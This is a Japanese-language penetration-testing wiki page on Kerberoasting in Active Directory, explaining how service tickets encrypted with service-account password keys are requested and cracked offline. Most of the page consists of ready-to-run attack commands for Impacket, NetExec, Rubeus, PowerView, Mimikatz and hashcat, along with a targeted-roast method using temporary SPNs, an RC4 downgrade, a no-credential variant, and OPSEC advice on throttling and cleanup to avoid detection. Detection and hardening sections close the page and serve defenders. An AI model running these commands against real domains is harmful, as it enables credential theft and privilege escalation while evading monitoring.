# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting は、Active Directory (AD) でユーザーアカウント（コンピューターアカウントを除く）のもとで稼働するサービスに関連する TGS チケットの取得に焦点を当てた手法です。これらのチケットの暗号化にはユーザーパスワード由来のキーが使われるため、オフラインで認証情報をクラッキングできます。ユーザーアカウントがサービスとして使われている場合、ServicePrincipalName (SPN) プロパティは空ではありません。

認証済みのドメインユーザーであれば誰でも TGS チケットを要求できるため、特別な権限は必要ありません。<sup>[[4]](#references)[[5]](#references)</sup>

### 主なポイント

- ユーザーアカウントのもとで実行されるサービス（SPN が設定されたアカウント。コンピューターアカウントではない）の TGS チケットを標的とします。
- チケットはサービスアカウントのパスワードから派生したキーで暗号化されており、オフラインでクラッキングできます。
- 高い権限は不要です。認証済みアカウントであれば誰でも TGS チケットを要求できます。

> [!WARNING]
> 公開されているツールの多くは、AES よりも高速にクラッキングできる RC4-HMAC (etype 23) のサービスチケットを優先して要求します。RC4 TGS hash は `$krb5tgs$23$*`、AES128 は `$krb5tgs$17$*`、AES256 は `$krb5tgs$18$*` で始まります。ただし、多くの環境では AES のみを使用する方向に移行しています。RC4 だけが関係すると決めつけないでください。
> また、「spray-and-pray」方式の roast は避けてください。Rubeus のデフォルトの kerberoast は、すべての SPN を照会してチケットを要求できるため、ノイズが多くなります。まず列挙を行い、興味深い principal を標的にしてください。

### サービスアカウントのシークレットと Kerberos の暗号処理コスト

多くのサービスは、現在も手動管理されたパスワードを持つユーザーアカウントのもとで稼働しています。KDC はそれらのパスワードから派生したキーでサービスチケットを暗号化し、認証済みの任意の principal に暗号文を渡します。そのため、kerberoasting ではアカウントロックアウトや DC のテレメトリを気にせず、無制限にオフラインで推測できます。暗号化モードによってクラッキングに必要な計算量が異なります。

| モード | キー導出 | 暗号化タイプ | RTX 5090 の概算スループット* | 備考 |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 を4,096回反復し、ドメイン + SPN から生成された principal ごとの salt を使用 | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | 約680万回/秒 | Salt により rainbow table は使えませんが、短いパスワードは依然として高速にクラッキングできます。 |
| RC4 + NT hash | パスワードの MD4 を1回計算（salt なしの NT hash）。Kerberos はチケットごとに8バイトの confounder を混ぜるだけ | etype 23 (`$krb5tgs$23$`) | 約 **41億** 回/秒 | AES より約1000倍高速です。`msDS-SupportedEncryptionTypes` が許可している場合、攻撃者は RC4 を強制します。 |

*ベンチマークは Chick3nman によるもので、[Matthew Green の Kerberoasting 分析](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)で引用されています。<sup>[[3]](#references)</sup>

RC4 の confounder はキーストリームをランダム化するだけで、推測1回あたりの処理量は増やしません。サービスアカウントがランダムなシークレット（gMSA/dMSA、マシンアカウント、または vault で管理された文字列）を使っていない限り、侵害にかかる時間は GPU の計算能力だけで決まります。AES のみの etype を強制すれば、毎秒数十億回の推測が可能になるダウングレードは防げますが、弱い人間のパスワードは依然として PBKDF2 でも破られます。<sup>[[3]](#references)</sup>

### Attack

#### Linux

NetExec で roast 可能なチケットを要求し、Hashcat でクラッキングする実用的な一連の例は、参考文献 [1] にあります。<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

kerberoastチェックを含む多機能ツール:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Kerberoastableなユーザーを列挙する

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Technique 1: TGSを要求してメモリからダンプする

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Technique 2: 自動ツール

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> TGS request により、Windows Security Event 4769（Kerberos service ticket が要求された）が生成されます。

### OPSEC と AES-only 環境

- AES を使用していないアカウントに対して、意図的に RC4 を要求する:
  - Rubeus: `/rc4opsec` は tgtdeleg を使用して AES を使用していないアカウントを列挙し、RC4 service ticket を要求します。
  - Rubeus: kerberoast で `/tgtdeleg` を指定すると、可能な場合に RC4 の要求も発生します。<sup>[[6]](#references)</sup>
- AES-only アカウントも、黙って失敗させずに Roast する:
  - Rubeus: `/aes` は AES が有効なアカウントを列挙し、AES service ticket（etype 17/18）を要求します。
  - すでに TGT（PTT または .kirbi から取得）を保持している場合は、`/spn:<SPN>` または `/spns:<file>` とともに `/ticket:<blob|path>` を使用すれば、LDAP を省略できます。
- ターゲット指定、スロットリング、ノイズの低減:
  - `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>`、`/jitter:<1-100>` を使用します。
  - `/pwdsetbefore:<MM-dd-yyyy>`（古いパスワード）で弱いパスワードが使われている可能性の高いアカウントに絞り込むか、`/ou:<DN>` で特権 OU を対象にします。<sup>[[8]](#references)</sup>

例（Rubeus）:

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### 永続化 / 悪用

アカウントを制御または変更できる場合、SPNを追加することでkerberoastableにできます:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

crackingを容易にするため、アカウントをダウングレードしてRC4を有効化する（対象オブジェクトへの書き込み権限が必要）:

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### ユーザーに対する GenericWrite/GenericAll を利用した Targeted Kerberoast（一時的な SPN）

BloodHound でユーザーオブジェクト（例: GenericWrite/GenericAll）を制御できるとわかった場合、そのユーザーに現在 SPN が設定されていなくても、確実にそのユーザーを「targeted-roast」できます:<sup>[[9]](#references)</sup>

- 制御下のユーザーに一時的な SPN を追加し、roast 可能にします。
- crack しやすくするため、その SPN に対して RC4（etype 23）で暗号化された TGS-REP を要求します。
- `$krb5tgs$23$...` hash を hashcat で crack します。
- フットプリントを減らすため、SPN を削除します。

Windows（PowerView/Rubeus）:

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linuxワンライナー（targetedKerberoast.py は SPN の追加 -> TGS（etype 23）のリクエスト -> SPN の削除を自動化します）：<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

hashcat autodetectで出力をCrackします（$krb5tgs$23$の場合はmode 13100）:

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

検知に関する注意: SPNを追加または削除すると、ディレクトリに変更が発生します（対象ユーザーのEvent ID 5136/4738）。TGS要求ではEvent ID 4769が生成されます。要求頻度を抑え、速やかにクリーンアップしてください。

Kerberoast攻撃に役立つツールはこちら: https://github.com/nidem/kerberoast

Linuxで次のエラーが発生した場合: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` ローカル時刻のずれが原因です。DCと時刻を同期してください。

- `ntpdate <DC_IP>`（一部のディストリビューションでは非推奨）
- `rdate -n <DC_IP>`

### ドメインアカウントなしでのKerberoast（AS-requested STs）

2022年9月、Charlie Clarkは、プリ認証が不要なprincipalの場合、要求本文のsnameを変更した細工済みKRB_AS_REQを使ってサービスチケットを取得でき、実質的にTGTの代わりにサービスチケットを取得できることを示しました。これはAS-REP roastingと同様の手法で、有効なドメイン資格情報は必要ありません。

詳細: Semperisの解説記事「New Attack Paths: AS-requested STs」。<sup>[[10]](#references)</sup>

> [!WARNING]
> 有効な資格情報がないとこの手法でLDAPを照会できないため、ユーザーのリストを指定する必要があります。

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

関連

AS-REP roastable users を標的にする場合は、こちらも参照してください。

{{#ref}}
asreproast.md
{{#endref}}

### 検知

Kerberoasting はステルス性の高い攻撃です。DC からの Event ID 4769 を調査し、フィルターを適用してノイズを減らします。

- サービス名 `krbtgt` と、`$` で終わるサービス名（コンピューターアカウント）を除外します。
- マシンアカウント（`*$$@*`）からのリクエストを除外します。
- 成功したリクエストのみ対象にします（Failure Code `0x0`）。
- 暗号化の種類を追跡します。RC4（`0x17`）、AES128（`0x11`）、AES256（`0x12`）。`0x17` のみを対象にアラートを出さないでください。

PowerShell によるトリアージの例：

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

追加のアイデア:

- ホスト／ユーザーごとの通常のSPN使用状況をベースライン化し、単一のプリンシパルから大量の異なるSPN要求があった場合にアラートを出す。
- AESで強化されたドメインで、通常と異なるRC4の使用を検出する。

### Mitigation / Hardening

- サービスにはgMSA/dMSAまたはマシンアカウントを使用する。管理アカウントは120文字以上のランダムなパスワードを持ち、自動的にローテーションされるため、オフラインでのクラッキングは現実的ではありません。<sup>[[7]](#references)</sup>
- `msDS-SupportedEncryptionTypes`をAESのみ（10進数の24 / 16進数の0x18）に設定してサービスアカウントでAESを強制し、その後パスワードをローテーションしてAESキーを生成する。<sup>[[7]](#references)</sup>
- 可能であれば、環境内でRC4を無効にし、RC4の使用試行を監視する。DCでは、`msDS-SupportedEncryptionTypes`が設定されていないアカウントのデフォルトを制御するために、`DefaultDomainSupportedEncTypes`レジストリ値を使用できます。十分にテストしてください。
- ユーザーアカウントから不要なSPNを削除する。<sup>[[7]](#references)</sup>
- 管理アカウントを使用できない場合は、長くランダムなサービスアカウントパスワード（25文字以上）を使用し、一般的なパスワードを禁止して定期的に監査する。<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP Kerberoast + hashcatによる実践的なクラック](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: レガシーKerberos暗号に対する低技術・高影響の攻撃（2025-09-10）](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos（II）：Kerberosを攻撃する方法](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: AES有効時にRC4暗号化TGSを要求する](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog（2024-10-11）– Kerberoastingの軽減に役立つMicrosoftのガイダンス](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoastコマンドのドキュメント](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOLの認証情報 → Targeted Kerberoast → Unconstrained Delegation → DCSyncによるDA取得](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – 新たな攻撃経路？要求されたサービスチケット（Charlie Clark、2022年9月）](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
